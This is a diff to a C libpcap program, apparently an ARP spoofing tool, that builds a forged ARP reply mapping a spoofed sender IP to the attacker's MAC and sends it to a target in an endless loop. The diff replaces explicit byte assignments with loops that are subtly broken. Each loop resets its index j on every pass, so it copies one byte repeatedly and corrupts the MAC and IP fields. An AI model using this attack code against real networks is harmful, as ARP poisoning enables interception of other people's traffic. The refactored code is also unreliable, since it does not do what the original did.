@@ -114,15 +114,49 @@ int main(int argc, char *argv[])
                 (packet_get[29] == tip[1]) && (packet_get[30] == tip[2]) && (packet_get[31] == tip[3]) )
             break;
     }
-    tmac[0] = packet_get[22];tmac[1] = packet_get[23];tmac[2] = packet_get[24];tmac[3] = packet_get[25];tmac[4] = packet_get[26];tmac[5] = packet_get[27];
-    packet[0] = tmac[0];packet[1] = tmac[1];packet[2] = tmac[2];packet[3] = tmac[3];packet[4] = tmac[4];packet[5] = tmac[5];
-    packet[6] = attack_mac[0];packet[7] = attack_mac[1];packet[8] = attack_mac[2];packet[9] = attack_mac[3];packet[10] = attack_mac[4];packet[11] = attack_mac[5];
-    packet[12] = 0x08; packet[13] = 0x06;
-    packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x02;
-    packet[22] = attack_mac[0];packet[23] = attack_mac[1];packet[24] = attack_mac[2];packet[25] = attack_mac[3];packet[26] = attack_mac[4];packet[27] = attack_mac[5];
-    packet[28] = sip[0];packet[29] = sip[1];packet[30] = sip[2];packet[31] = sip[3];
-    packet[32] = tmac[0]; packet[33] = tmac[1]; packet[34] = tmac[2]; packet[35] = tmac[3]; packet[36] = tmac[4]; packet[37] = tmac[5];
-    packet[38] = tip[0];packet[39] = tip[1];packet[40] = tip[2];packet[41] = tip[3];
+    for(int i=0; i<6; i++){
+        int j=22;
+        tmac[i] = packet_get[j];
+        j++;
+    }
+    for(int i=0; i<6; i++){
+        packet[i] = tmac[i];
+    }
+    for(int i=6; i<12; i++){
+        int j=0;
+        packet[i] = attack_mac[j];
+        j++;
+    }
+    packet[12] = 0x08;
+    packet[13] = 0x06;
+    packet[14] = 0x00;
+    packet[15] = 0x01;
+    packet[16] = 0x08;
+    packet[17] = 0x00;
+    packet[18] = 0x06;
+    packet[19] = 0x04;
+    packet[20] = 0x00;
+    packet[21] = 0x02;
+    for(int i=22; i<28; i++){
+        int j=0;
+        packet[i] = attack_mac[j];
+        j++;
+    }
+    for(int i=28; i<32; i++){
+        int j=0;
+        packet[i] = sip[j];
+        j++;
+    }
+    for(int i=32; i<38; i++){
+        int j=0;
+        packet[i] = tmac[j];
+        j++;
+    }
+    for(int i=38; i<42; i++){
+        int j=0;
+        packet[i] = tip[j];
+        j++;
+    }
     while(1)
     {
         pcap_sendpacket(handle, packet, 60);
